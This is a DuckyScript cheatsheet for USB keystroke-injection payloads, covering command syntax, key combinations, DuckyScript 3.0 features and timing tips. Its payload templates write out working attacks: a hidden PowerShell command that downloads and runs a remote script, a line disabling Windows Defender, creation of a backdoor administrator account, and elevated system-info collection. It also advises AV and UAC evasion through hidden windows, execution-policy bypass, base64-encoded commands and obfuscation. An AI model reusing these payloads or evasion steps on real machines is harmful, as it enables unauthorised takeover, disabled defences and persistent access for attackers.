# DuckyScript Quick Reference Cheatsheet

## Basic Commands

| Command | Description | Example |
|---------|-------------|---------|
| `REM` | Comment (ignored) | `REM This is a comment` |
| `DELAY` | Pause in milliseconds | `DELAY 1000` |
| `STRING` | Type text | `STRING Hello World` |
| `STRINGLN` | Type text + Enter | `STRINGLN echo test` |
| `ENTER` | Press Enter key | `ENTER` |
| `GUI` | Windows/Command key | `GUI r` |
| `ALT` | Alt key | `ALT F4` |
| `CTRL` | Control key | `CTRL c` |
| `SHIFT` | Shift key | `SHIFT TAB` |
| `TAB` | Tab key | `TAB` |
| `ESCAPE` | Escape key | `ESCAPE` |
| `SPACE` | Space key | `SPACE` |

## Key Combinations

```
GUI r           Windows Run dialog
GUI d           Show desktop
GUI l           Lock workstation
GUI e           File Explorer
GUI x           Power User menu (Win10/11)
ALT TAB         Switch windows
ALT F4          Close window
CTRL ALT DELETE Security options
CTRL SHIFT ESC  Task Manager
CTRL c          Copy
CTRL v          Paste
CTRL z          Undo
CTRL a          Select all
CTRL s          Save
F1-F12          Function keys
```

## DuckyScript 3.0 Features

### Variables
```
VAR $myVar = "Hello"
STRING $myVar
```

### Constants
```
DEFINE #TARGET_IP 192.168.1.100
STRING #TARGET_IP
```

### Conditionals
```
IF TRUE THEN
    STRING Condition met
END_IF

IF $_CAPSLOCK_ON THEN
    CAPSLOCK
END_IF
```

### Loops
```
WHILE TRUE
    STRING Looping
    DELAY 1000
END_WHILE
```

### Functions
```
FUNCTION myFunc()
    STRING Hello from function
END_FUNCTION

myFunc()
```

### Random Delays
```
RANDOM_DELAY 100 500
```

## Built-in Variables

| Variable | Description |
|----------|-------------|
| `$_RANDOM_INT` | Random integer |
| `$_RANDOM_CHAR` | Random character |
| `$_CAPSLOCK_ON` | Caps Lock state |
| `$_NUMLOCK_ON` | Num Lock state |
| `$_SCROLLLOCK_ON` | Scroll Lock state |
| `$_TIME` | Current time |
| `$_DATE` | Current date |
| `$_HOST_IP` | Host IP address |
| `$_OS` | Operating system |

## Special Keys

```
UPARROW / UP        Arrow up
DOWNARROW / DOWN    Arrow down
LEFTARROW / LEFT    Arrow left
RIGHTARROW / RIGHT  Arrow right
PAGEUP              Page Up
PAGEDOWN            Page Down
HOME                Home
END                 End
INSERT              Insert
DELETE              Delete
BACKSPACE           Backspace
PRINTSCREEN         Print Screen
PAUSE               Pause/Break
NUMLOCK             Num Lock
CAPSLOCK            Caps Lock
SCROLLLOCK          Scroll Lock
MENU / APP          Application/Menu key
```

## OS-Specific Quick Commands

### Windows - Open PowerShell (Admin)
```
GUI x
DELAY 500
a
DELAY 1000
```

### Windows - Open CMD
```
GUI r
DELAY 500
STRING cmd
ENTER
```

### Windows - Open Run Dialog
```
GUI r
DELAY 300
```

### macOS - Open Terminal
```
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
```

### Linux - Open Terminal
```
CTRL ALT t
DELAY 500
```

## Common Payload Templates

### Windows Info Grabber
```
REM Windows System Info
DELAY 1000
GUI r
DELAY 500
STRING powershell
CTRL SHIFT ENTER
DELAY 1500
ALT y
DELAY 1000
STRING systeminfo > $env:TEMP\info.txt
ENTER
```

### Quick Web Download
```
REM Download and execute
GUI r
DELAY 500
STRING powershell -w hidden -c "IWR http://IP/file.ps1 -O $env:TEMP\r.ps1; & $env:TEMP\r.ps1"
ENTER
```

### Disable Windows Defender
```
REM Requires Admin
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
```

### Add User (Windows)
```
STRING net user hacker P@ssw0rd /add
ENTER
STRING net localgroup administrators hacker /add
ENTER
```

## Timing Reference

| Delay | Use Case |
|-------|----------|
| 100-300ms | Between keystrokes |
| 500ms | Menu/dialog opening |
| 1000ms | Application launch |
| 2000-3000ms | PowerShell/Admin prompt |
| 5000ms+ | Heavy operations |

## Keyboard Layout Reference

### Characters that differ by layout:

| US | German | French | UK |
|----|--------|--------|-----|
| `y` | `z` | `y` | `y` |
| `z` | `y` | `w` | `z` |
| `-` | `ß` | `)` | `-` |
| `[` | `ü` | `^` | `[` |
| `]` | `+` | `$` | `]` |
| `;` | `ö` | `m` | `;` |
| `'` | `ä` | `ù` | `'` |

## Execution Flags (PowerShell)

```
-ExecutionPolicy Bypass    Bypass execution policy
-NoProfile                 Don't load profile
-WindowStyle Hidden        Hide window
-NonInteractive            No user interaction
-EncodedCommand            Base64 encoded command
-w hidden                  Short for WindowStyle Hidden
-ep bypass                 Short for ExecutionPolicy Bypass
```

## Base64 Encoding (PowerShell)

```powershell
# Encode
$cmd = "whoami"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)

# Use in payload
powershell -enc $encoded
```

## Common Errors & Solutions

| Error | Cause | Solution |
|-------|-------|----------|
| Wrong characters | Keyboard layout | Use correct DUCKY_LANG |
| Commands fail | Timing too fast | Increase DELAY values |
| UAC blocks | No admin | Add UAC bypass |
| AV blocks | Detection | Use obfuscation |
| Payload truncated | Too long | Use staged payload |

## Testing Checklist

- [ ] Test on same OS version
- [ ] Verify keyboard layout
- [ ] Check timing on slow systems
- [ ] Test with AV enabled
- [ ] Verify network connectivity
- [ ] Test admin vs non-admin

---

## Quick Debug Template

```
REM Debug payload - shows what's happening
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING === PAYLOAD START ===
ENTER
STRING OS: Windows
ENTER
STRING Time:
STRING %TIME%
ENTER
STRING === PAYLOAD END ===
```

---

[← Back to Main](../README.md)
